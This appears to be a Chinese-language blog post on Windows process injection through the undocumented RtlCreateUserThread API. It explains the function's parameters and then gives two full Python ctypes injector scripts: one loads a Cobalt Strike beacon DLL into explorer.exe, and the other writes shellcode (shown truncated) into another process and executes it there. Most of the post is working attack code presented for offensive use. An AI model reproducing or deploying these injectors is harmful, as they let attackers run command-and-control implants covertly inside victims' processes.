RtlCreateUserThread
RtlCreateUserThread是类似于CreateRemoteThread的一个未公开底层API函数，此函数定义在ntdll.dll库中，可以实现相同的远程线程注入操作。函数最终调用的是NtCreateThread。

MSF是用的RtlCreateUserThread实现dll注入的，可以见得挺好使的。
函数原型:
http://undocumented.ntinternals.net/
RtlCreateUserThread(  IN HANDLE               ProcessHandle,  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,  IN BOOLEAN              CreateSuspended,  IN ULONG                StackZeroBits,  IN OUT PULONG           StackReserved,  IN OUT PULONG           StackCommit,  IN PVOID                StartAddress,  IN PVOID                StartParameter OPTIONAL,  OUT PHANDLE             ThreadHandle,  OUT PCLIENT_ID          ClientID );
该函数返回值是调用是否成功，而不是返回创建的远程线程句柄

VirtualFreeEx
在指定进程的虚拟地址空间内释放，解除授权或释放并解除授权的内存区域。
函数原型：
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex
BOOL VirtualFreeEx(  HANDLE hProcess,  LPVOID lpAddress,  SIZE_T dwSize,  DWORD  dwFreeType);
如果函数成功，则返回值为非零值。

当我们线程注入成功后为了保险起见，需要释放我们存放dll绝对路径的进程内存。
ctypes.windll.kernel32.VirtualFreeEx(h_handle,arg_address,len(dll_path),(0x4000 | 0x8000))

DLL注入

RtlCreateUserThread的各种参数中
第1参数传入已打开的进程句柄
第7参数对应LoadLibraryA函数指针
使用ctypes的WINFUNCTYPE转换出LPTHREADSTARTROUTINE格式的函数指针
LLA = ctypes.windll.kernel32.GetProcAddress(handle, b'LoadLibraryA')LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)start = LPTHREAD_START_ROUTINE(LLA)
第8参数对应dll的绝对路径
ThreadHandle参数是输出远程线程的句柄，我们需要创建一个线程的句柄变量指向它(测试传入0也行)
h_Thread = (wintypes.HANDLE)(0)ctypes.windll.ntdll.RtlCreateUserThread(h_process, None, 0, 0, 0, 0, start, arg_address, h_Thread, None)ctypes.windll.kernel32.WaitForSingleObject(h_Thread, -1)
最终代码在CreateRemoteThread注入的模板上进行修改，将CreateRemoteThread注入模块改为上面的RtlCreateUserThread函数即可，未知的参数填None。

使用CS生成64位beacon.dll，注入程序测试的explorer，pid为10684
import ctypesfrom ctypes import *from ctypes import wintypesimport sys,os
def inject(file,pid):    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))    if h_process:        dll_path = os.path.abspath(file)        print(dll_path)        # dll_path = "C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll"        dll_path = bytearray(dll_path)
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process, ctypes.c_int(0), ctypes.c_int(len(dll_path)),ctypes.c_int(0x3000), ctypes.c_int(0x04))        buf = (ctypes.c_char * len(dll_path)).from_buffer(dll_path)        ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, buf, len(dll_path))
        ctypes.windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]        ctypes.windll.kernel32.GetModuleHandleW.restype = c_void_p        handle = ctypes.windll.kernel32.GetModuleHandleW("kernel32")        ctypes.windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]        ctypes.windll.kernel32.GetProcAddress.restype = c_void_p        LLA = ctypes.windll.kernel32.GetProcAddress(handle, b'LoadLibraryA')        print("LoadLibraryA:{}".format(LLA))
        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)        start = LPTHREAD_START_ROUTINE(LLA)
        h_Thread = (wintypes.HANDLE)(0)        ctypes.windll.ntdll.RtlCreateUserThread(h_process, None, 0, 0, 0, 0, start, arg_address, h_Thread, None)        ctypes.windll.kernel32.WaitForSingleObject(h_Thread, -1)        ctypes.windll.kernel32.VirtualFreeEx(h_process,arg_address,len(dll_path),(0x4000 | 0x8000))        ctypes.windll.kernel32.CloseHandle(h_Thread)        ctypes.windll.kernel32.CloseHandle(h_process)    else:        print("open process error")        sys.exit()
if __name__ == '__main__':    inject(sys.argv[1],sys.argv[2])

import ctypesfrom ctypes import *from ctypes import wintypesimport sys
def inject(pid):    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))    if h_process:        shellcode = b"\xfc\x48\x83\xe4......"        shellcode = bytearray(shellcode)        ptr = ctypes.windll.kernel32.VirtualAllocEx(h_process, ctypes.c_int(0), ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000), ctypes.c_int(0x40))        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)        ctypes.windll.kernel32.WriteProcessMemory(h_process, ptr, buf, len(shellcode))
        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)        start = LPTHREAD_START_ROUTINE(ptr)
        h_Thread = (wintypes.HANDLE)(0)        ctypes.windll.ntdll.RtlCreateUserThread(h_process, None, 0, 0, 0, 0, start, 0, h_Thread, None)        ctypes.windll.kernel32.WaitForSingleObject(h_Thread, -1)
        ctypes.windll.kernel32.CloseHandle(h_Thread)        ctypes.windll.kernel32.CloseHandle(h_process)    else:        print("open process error")        sys.exit()
if __name__ == '__main__':    inject(sys.argv[1])
